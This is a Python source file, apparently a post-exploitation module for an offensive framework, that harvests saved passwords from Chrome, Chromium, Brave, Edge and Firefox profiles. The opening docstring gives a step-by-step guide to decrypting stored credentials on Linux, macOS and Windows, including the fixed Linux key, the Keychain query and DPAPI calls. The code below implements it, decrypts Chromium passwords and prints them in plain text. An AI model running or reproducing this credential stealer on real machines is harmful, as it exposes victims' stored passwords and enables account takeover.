"""STUB — Browser credential extraction.

Extracts saved login credentials from Chromium-based browsers and Firefox.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

CHROMIUM-BASED BROWSERS (Chrome, Edge, Brave, Opera, Vivaldi)
--------------------------------------------------------------
All store credentials in an SQLite database called "Login Data".

Locate the profile directory:
  Linux  : ~/.config/google-chrome/Default/Login Data
           ~/.config/chromium/Default/Login Data
           ~/.config/microsoft-edge/Default/Login Data
  macOS  : ~/Library/Application Support/Google/Chrome/Default/Login Data
  Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data

The browser locks this file while running.  Copy it first:
  import shutil, tempfile
  tmp = shutil.copy(login_data_path, tempfile.mktemp(suffix=".db"))

Query credentials:
  import sqlite3
  conn = sqlite3.connect(tmp)
  rows = conn.execute(
      "SELECT origin_url, username_value, password_value FROM logins"
  ).fetchall()

Decrypt password_value (a binary blob):

  LINUX — AES-256-CBC with a key derived from the fixed passphrase "peanuts":
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import base64

    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                     salt=b"saltysalt", iterations=1)
    key = kdf.derive(b"peanuts")

    # Ciphertext starts with b"v10" or b"v11" — strip the first 3 bytes, then:
    ciphertext = password_value[3:]
    iv = b"\\x20" * 16
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    # Strip PKCS7 padding
    pad_len = plaintext[-1]
    password = plaintext[:-pad_len].decode("utf-8", errors="replace")

  macOS — same AES-CBC, but the key comes from the macOS Keychain:
    import subprocess
    result = subprocess.run(
        ["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
        capture_output=True, text=True
    )
    chrome_password = result.stdout.strip().encode()
    # Then derive key with PBKDF2 as above, using chrome_password instead of b"peanuts"

  WINDOWS — DPAPI or AES-256-GCM (Chrome 80+):
    Step 1: Read the master encryption key from Local State:
      import json, base64
      local_state_path = os.path.join(os.path.dirname(login_data_path), "..", "Local State")
      with open(local_state_path) as f:
          local_state = json.load(f)
      encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
      encrypted_key = encrypted_key[5:]   # strip "DPAPI" prefix

    Step 2: Decrypt the master key with DPAPI:
      import ctypes
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]
      p = ctypes.create_string_buffer(encrypted_key, len(encrypted_key))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)
      )
      master_key = ctypes.string_at(blobout.pbData, blobout.cbData)

    Step 3: Decrypt each password blob (format: b"v10" + 12-byte nonce + AES-GCM ciphertext):
      from cryptography.hazmat.primitives.ciphers.aead import AESGCM
      nonce = password_value[3:15]
      ciphertext = password_value[15:]
      aesgcm = AESGCM(master_key)
      password = aesgcm.decrypt(nonce, ciphertext, None).decode()

  pip install: cryptography  (pywin32 for Windows DPAPI helpers)


FIREFOX
-------
Credentials live in:
  Linux/macOS : ~/.mozilla/firefox/<profile>/logins.json
  Windows     : %APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile>\\logins.json

logins.json schema (relevant fields):
  hostname, encryptedUsername, encryptedPassword, encType (1 = DES3)

Encryption uses NSS (Mozilla's crypto library):
  Option A — call libnss3.so directly via ctypes:
    import ctypes, ctypes.util
    nss = ctypes.CDLL(ctypes.util.find_library("nss3"))
    nss.NSS_Init(profile_dir.encode())
    # Use PK11SDR_Decrypt to decrypt each base64-encoded blob
    # The decrypted bytes are ASN.1 DER-encoded — extract the octet-string value

  Option B — use firepwd.py (MIT-licensed, ~300 lines):
    https://github.com/lclevy/firepwd
    Handles both the old 3DES-CBC scheme and the newer AES-256-CBC scheme
    introduced in Firefox 75+ (uses key4.db instead of key3.db)

  Option C — call Firefox's own NSS via subprocess with nss tools:
    certutil, pk12util — rarely available without a full NSS install

  pip install: pycryptodome  (for DES3/AES in pure Python without NSS)


OUTPUT FORMAT
-------------
Return a list of dicts, one per credential:
  {
    "browser": "chrome",
    "url": "https://example.com",
    "username": "alice",
    "password": "hunter2",
    "profile": "/home/alice/.config/google-chrome/Default",
  }
"""

import json
import os
import platform
import shutil
import sqlite3
import subprocess
import tempfile
from pathlib import Path

from post.base import ModuleResult, PostModule
from post.loader import register



# ── Crypto helpers ─────────────────────────────────────────────────────────────

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes as _hashes
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False


def _pbkdf2_key(password: bytes, iterations: int) -> bytes:
    kdf = PBKDF2HMAC(algorithm=_hashes.SHA1(), length=16, salt=b"saltysalt", iterations=iterations)  # noqa: S303
    return kdf.derive(password)


def _aes_cbc_decrypt(ciphertext: bytes, key: bytes) -> str:
    payload = ciphertext[3:]        # strip b"v10" / b"v11"
    iv = b"\x20" * 16              # Chrome uses space-filled IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    dec = cipher.decryptor()
    plaintext = dec.update(payload) + dec.finalize()
    pad = plaintext[-1]            # PKCS7 padding
    return plaintext[:-pad].decode("utf-8", errors="replace")


def _chrome_key_linux() -> bytes:
    return _pbkdf2_key(b"peanuts", 1)


def _chrome_key_macos() -> bytes | None:
    try:
        r = subprocess.run(
            ["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
            capture_output=True, text=True, timeout=5,
        )
        pw = r.stdout.strip()
        if pw:
            return _pbkdf2_key(pw.encode(), 1003)
    except Exception:
        pass
    return None


def _decrypt(raw: bytes, key: bytes) -> str:
    if not raw:
        return ""
    if raw[:3] in (b"v10", b"v11"):
        try:
            return _aes_cbc_decrypt(raw, key)
        except Exception as e:
            return f"[decrypt_error: {e}]"
    return raw.decode("utf-8", errors="replace")


# ── Browser discovery ──────────────────────────────────────────────────────────

def _chrome_locations() -> list[tuple[str, Path]]:
    home = Path.home()
    system = platform.system()
    if system == "Linux":
        candidates = [
            ("Chrome",   home / ".config" / "google-chrome"),
            ("Chromium", home / ".config" / "chromium"),
            ("Brave",    home / ".config" / "BraveSoftware" / "Brave-Browser"),
            ("Edge",     home / ".config" / "microsoft-edge"),
        ]
    elif system == "Darwin":
        sup = home / "Library" / "Application Support"
        candidates = [
            ("Chrome",   sup / "Google" / "Chrome"),
            ("Chromium", sup / "Chromium"),
            ("Brave",    sup / "BraveSoftware" / "Brave-Browser"),
            ("Edge",     sup / "Microsoft Edge"),
        ]
    else:
        return []
    return [(n, p) for n, p in candidates if p.exists()]


def _firefox_profiles() -> list[tuple[str, Path]]:
    home = Path.home()
    system = platform.system()
    if system == "Linux":
        root = home / ".mozilla" / "firefox"
        ini = root / "profiles.ini"
    elif system == "Darwin":
        root = home / "Library" / "Application Support" / "Firefox"
        ini = root / "profiles.ini"
    else:
        return []

    profiles: list[tuple[str, Path]] = []
    if ini.exists():
        import configparser
        cfg = configparser.ConfigParser()
        cfg.read(str(ini))
        for sec in cfg.sections():
            if not sec.startswith("Profile"):
                continue
            rel = cfg.getint(sec, "IsRelative", fallback=1)
            path_val = cfg.get(sec, "Path", fallback=None)
            name_val = cfg.get(sec, "Name", fallback=sec)
            if not path_val:
                continue
            prof = (ini.parent / path_val) if rel else Path(path_val)
            if prof.exists():
                profiles.append((name_val, prof))
    return profiles


# ── Extraction ─────────────────────────────────────────────────────────────────

def _extract_chrome(label: str, login_data: Path, key: bytes) -> list[dict]:
    rows: list[dict] = []
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        shutil.copy2(str(login_data), tmp_path)
        conn = sqlite3.connect(tmp_path)
        conn.row_factory = sqlite3.Row
        try:
            cur = conn.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins WHERE blacklisted_by_user = 0"
            )
            for row in cur:
                rows.append({
                    "browser":  label,
                    "url":      row["origin_url"],
                    "username": row["username_value"],
                    "password": _decrypt(bytes(row["password_value"]), key),
                })
        finally:
            conn.close()
    except Exception as e:
        rows.append({"browser": label, "error": str(e)})
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
    return rows


def _extract_firefox(name: str, prof: Path) -> list[dict]:
    logins_path = prof / "logins.json"
    try:
        data = json.loads(logins_path.read_text())
        return [
            {
                "browser":  "Firefox",
                "profile":  name,
                "url":      e.get("hostname", ""),
                "username": "(encrypted — needs NSS)",
                "password": "(encrypted — needs NSS/firepwd)",
            }
            for e in data.get("logins", [])
        ]
    except Exception as e:
        return [{"browser": "Firefox", "profile": name, "error": str(e)}]


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class BrowserCredModule(PostModule):
    NAME        = "cred/browser"
    DESCRIPTION = "Extract saved credentials from Chrome/Chromium/Firefox browser profiles"
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        if not _CRYPTO_OK:
            return ModuleResult(ok=False, output="", error="pip install cryptography")

        system = platform.system()
        results: list[dict] = []
        warnings: list[str] = []

        # Chromium-family key
        if system == "Linux":
            key = _chrome_key_linux()
        elif system == "Darwin":
            key = _chrome_key_macos()
            if key is None:
                warnings.append("Could not retrieve Chrome Safe Storage key from Keychain")
                key = _chrome_key_linux()
        else:
            return ModuleResult(ok=False, output="", error=f"Unsupported: {system}")

        for browser_name, browser_dir in _chrome_locations():
            for profile_dir in (browser_dir.iterdir() if browser_dir.is_dir() else []):
                login_data = profile_dir / "Login Data"
                if login_data.exists():
                    results.extend(_extract_chrome(f"{browser_name}/{profile_dir.name}", login_data, key))

        for prof_name, prof_dir in _firefox_profiles():
            results.extend(_extract_firefox(prof_name, prof_dir))

        creds = [r for r in results if "error" not in r]
        errors = [r["error"] for r in results if "error" in r] + warnings

        lines = [f"Found {len(creds)} saved credential(s)", ""]
        for r in creds:
            lines += [
                f"  [{r.get('browser', '?')}]  {r.get('url', '')}",
                f"    User:     {r.get('username', '')}",
                f"    Password: {r.get('password', '')}",
                "",
            ]
        if errors:
            lines += ["Errors / warnings:"] + [f"  ! {e}" for e in errors]

        return ModuleResult(
            ok=True,
            output="\n".join(lines),
            data={"credentials": creds, "count": len(creds), "errors": errors},
        )
